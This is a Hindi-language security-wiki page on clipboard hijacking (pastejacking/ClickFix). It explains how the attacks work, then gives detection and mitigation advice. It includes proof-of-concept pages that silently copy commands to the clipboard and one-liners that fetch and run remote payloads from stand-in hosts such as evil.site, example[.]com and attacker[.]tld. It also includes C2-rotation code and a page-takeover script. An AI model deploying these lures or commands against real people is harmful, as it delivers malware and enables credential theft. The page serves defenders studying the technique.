# Clipboard Hijacking (Pastejacking) हमले

{{#include ../../banners/hacktricks-training.md}}

> "कभी भी कुछ भी पेस्ट न करें जिसे आपने खुद कॉपी न किया हो।" – पुरानी परन्तु आज भी प्रासंगिक सलाह

## अवलोकन

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस बात का दुरुपयोग करता है कि उपयोगकर्ता सामान्यतः बिना जांचे कमांड्स को कॉपी-और-पेस्ट कर लेते हैं। एक malicious वेब पेज (या कोई भी JavaScript-सक्षम context जैसे Electron या Desktop application) प्रोग्रामैटिकली हमलावर-नियंत्रित टेक्स्ट को सिस्टम clipboard में रखता है। शिकारों को, आमतौर पर सावधानीपूर्वक बनाए गए social-engineering निर्देशों के माध्यम से, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाने या टर्मिनल खोलकर clipboard सामग्री को *paste* करने के लिए प्रोत्साहित किया जाता है, जिससे तुरंत arbitrary commands execute हो जाते हैं।

क्योंकि **कोई फ़ाइल डाउनलोड नहीं होती और कोई attachment खुलता नहीं है**, यह तकनीक उन अधिकांश ई‑मेल और वेब‑कंटेंट सुरक्षा नियंत्रणों को बायपास कर देती है जो attachments, macros या direct command execution की निगरानी करते हैं। इसलिए यह हमला phishing अभियानों में लोकप्रिय है, जो NetSupport RAT, Latrodectus loader या Lumma Stealer जैसी commodity malware families पहुँचाते हैं।

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake फ़्लो

1. उपयोगकर्ता एक typosquatted या compromised साइट पर जाता है (उदा. `docusign.sa[.]com`)
2. इंजेक्ट की गई **ClearFake** JavaScript `unsecuredCopyToClipboard()` helper को कॉल करती है जो चुपचाप Base64-encoded PowerShell one-liner को clipboard में स्टोर कर देती है।
3. HTML निर्देश पीड़ित को बताते हैं: *“**Win + R** दबाएँ, कमांड पेस्ट करें और Enter दबाएँ ताकि समस्या हल हो।”*
4. `powershell.exe` निष्पादित होता है, और एक archive डाउनलोड करता है जिसमें एक legitimate executable और एक malicious DLL शामिल होता है (classic DLL sideloading)।
5. लोडर अतिरिक्त स्टेजेस को डिक्रिप्ट करता है, shellcode इंजेक्ट करता है और persistence इंस्टॉल करता है (उदा. scheduled task) — अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।

### NetSupport RAT की उदाहरण श्रृंखला
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (वैध Java WebStart) अपने डायरेक्टरी में `msvcp140.dll` खोजता है।
* दुर्भावनापूर्ण DLL डायनामिक रूप से APIs को **GetProcAddress** के माध्यम से resolve करता है, दो बाइनरीज़ (`data_3.bin`, `data_4.bin`) **curl.exe** के जरिए डाउनलोड करता है, उन्हें rolling XOR key `"https://google.com/"` से decrypt करता है, अंतिम shellcode inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में unzip कर देता है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** के साथ `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को निष्पादित करता है
3. MSI payload प्राप्त करता है → एक signed application के बगल में `libcef.dll` छोड़ता है → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer के माध्यम से MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** कॉल एक छिपी हुई PowerShell स्क्रिप्ट लॉन्च करती है जो `PartyContinued.exe` को प्राप्त करती है, `Boat.pst` (CAB) को निकालती है, `AutoIt3.exe` को `extrac32` & file concatenation के जरिए पुनर्निर्मित करती है और अंततः एक `.a3x` स्क्रिप्ट चलाती है जो browser credentials को `sumeriavgv.digital` पर exfiltrates करती है।

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix campaigns पूरी तरह फ़ाइल डाउनलोड्स को skip कर देते हैं और पीड़ितों को निर्देश देते हैं कि वे एक one‑liner पेस्ट करें जो WSH के माध्यम से JavaScript को fetch और execute करता है, इसे persist करता है, और रोज़ाना C2 को rotate करता है। निम्नलिखित देखा गया चेन:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Obfuscated URL को runtime पर उल्टा किया जाता है ताकि साधारण निरीक्षण असफल रहे।
- JavaScript अपने आप को Startup LNK (WScript/CScript) के माध्यम से पर्सिस्ट कर देता है, और वर्तमान दिन के आधार पर C2 चुनता है — तेज domain rotation सक्षम करता है।

C2s को तारीख के आधार पर rotate करने के लिए प्रयुक्त न्यूनतम JS फ्रेगमेंट:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला चरण आमतौर पर एक loader डिप्लॉय करता है जो persistence स्थापित करता है और एक RAT (e.g., PureHVNC) खींचता है, अक्सर TLS को एक hardcoded certificate पर पिन करता है और ट्रैफ़िक को chunk करता है।

Detection ideas specific to this variant
- प्रोसेस ट्री: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU और command‑line telemetry में `.split('').reverse().join('')` या `eval(a.responseText)` शामिल होना।
- Repeated `powershell -NoProfile -NonInteractive -Command -` बड़े stdin payloads के साथ ताकि लंबी स्क्रिप्ट्स बिना लंबे command lines के feed की जा सकें।
- Scheduled Tasks जो बाद में LOLBins जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` को एक updater‑से दिखने वाले task/path (e.g., `\GoogleSystem\GoogleUpdater`) के तहत execute करते हैं।

Threat hunting
- रोज़ाना बदलने वाले C2 hostnames और URLs जिनमें `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` पैटर्न होता है।
- clipboard write events की correlation जो Win+R paste के बाद तुरंत `powershell.exe` execution से जुड़ती हों।

Blue-teams clipboard, process-creation और registry telemetry को combine करके pastejacking दुर्व्यवहार का पता लगा सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` Win + R कमांड्स का इतिहास रखता है – असामान्य Base64 / obfuscated entries देखें।
* Security Event ID **4688** (Process Creation) जहां `ParentImage` == `explorer.exe` और `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** उन फ़ाइल क्रिएशनों के लिए जो `%LocalAppData%\Microsoft\Windows\WinX\` या टेम्पररी फ़ोल्डरों के अंतर्गत suspicious 4688 event से ठीक पहले होती हैं।
* EDR clipboard sensors (if present) – correlate `Clipboard Write` जिसे तुरंत एक नया PowerShell process फॉलो करे।

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

हालिया अभियानों ने नकली CDN/browser verification पेज बड़े पैमाने पर बनाये हैं ("Just a moment…", IUAM-style) जो users को मजबूर करते हैं कि वे अपने clipboard से OS-specific commands को native consoles में कॉपी करें। इससे execution browser sandbox से बाहर निकलता है और यह Windows और macOS दोनों पर काम करता है।

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` ताकि payloads को tailor किया जा सके (Windows PowerShell/CMD vs. macOS Terminal)। unsupported OS के लिए optional decoys/no-ops illusion बनाए रखने के लिए।
- benign UI actions (checkbox/Copy) पर automatic clipboard-copy जबकि visible text clipboard content से अलग हो सकता है।
- Mobile blocking और step-by-step instructions वाला एक popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation और single-file injector जो compromised साइट के DOM को Tailwind-styled verification UI से overwrite कर दे (कोई नया domain registration आवश्यक नहीं)।

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS प्रारंभिक रन की persistence
- इस्तेमाल करें `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ताकि टर्मिनल बंद होने के बाद भी execution जारी रहे, दिखाई देने वाले artifacts कम हों।

compromised sites पर In-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-शैली के लुभावनों के लिए पहचान और शिकार विचार

- Web: ऐसे पृष्ठ जो Clipboard API को verification widgets से बाइंड करते हैं; प्रदर्शित टेक्स्ट और clipboard payload के बीच असंगति; `navigator.userAgent` ब्रांचिंग; संदिग्ध संदर्भों में Tailwind + single-page replace।
- Windows endpoint: ब्राउज़र इंटरैक्शन के तुरंत बाद `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` से batch/MSI installers का निष्पादन।
- macOS endpoint: ब्राउज़र घटनाओं के पास Terminal/iTerm द्वारा `bash`/`curl`/`base64 -d` को `nohup` के साथ spawn करना; टर्मिनल बंद होने पर भी जीवित रहनी वाली background jobs।
- `RunMRU` Win+R इतिहास और clipboard writes को बाद में बनने वाली console प्रक्रियाओं के साथ सहसंबंधित करें।

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## निवारण

1. ब्राउज़र हार्डनिंग – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) को निष्क्रिय करें या user gesture आवश्यक बनाएं।
2. सुरक्षा जागरूकता – उपयोगकर्ताओं को सिखाएँ कि संवेदनशील कमांड्स को *type* करें या पहले किसी text editor में पेस्ट करें।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control का उपयोग arbitrary one-liners को ब्लॉक करने के लिए।
4. नेटवर्क नियंत्रण – ज्ञात pastejacking और malware C2 डोमेनों के लिए outbound अनुरोधों को ब्लॉक करें।

## संबंधित ट्रिक्स

* **Discord Invite Hijacking** अक्सर वही ClickFix approach का दुरुपयोग करता है जब उपयोगकर्ताओं को एक malicious server में लुभाया जाता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## संदर्भ

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
